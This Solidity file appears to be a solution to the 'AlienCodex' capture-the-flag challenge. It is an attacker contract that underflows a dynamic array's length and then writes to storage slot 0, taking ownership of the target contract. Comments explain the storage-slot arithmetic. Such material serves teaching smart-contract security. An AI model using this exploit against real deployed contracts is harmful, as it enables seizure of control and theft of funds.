// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./19-AlienCodex.sol";

contract AlienCodexAttacker {
    AlienCodex public alienCodex;

    constructor(address _alienCodexAddress) public {
        alienCodex = AlienCodex(_alienCodexAddress);
    }

    function attack() public {
        /*Making a contact to pass modifier */
        alienCodex.make_contact();

        /*Thanks retract function we make overflow of the
        dynamic array and cover by it the whole storage */
        alienCodex.retract();

        /*We want to overwrite slot number 0, because there is 
        contact bool and owner address.

        number of slot    |      Variable
        __________________|_______________________________________________
            0             |      contact bool & owner address
            1             |      lenght of array
            keccak256(1)    |      codex[0]
            keccak256(1)+1  |      codex[1]
            2^(256)-1       |      codex[2^(256)-1-uint(keccak256(1))]
            0             |      codex[2^(256)-1-uint(keccak256(1)) + 1]

            */

        uint256 index = 2**256 - 1 - uint256(keccak256(abi.encode(1))) + 1;

        // 4. Overwrite the owner
        alienCodex.revise(index, bytes32(uint256(address(msg.sender))));
    }
}
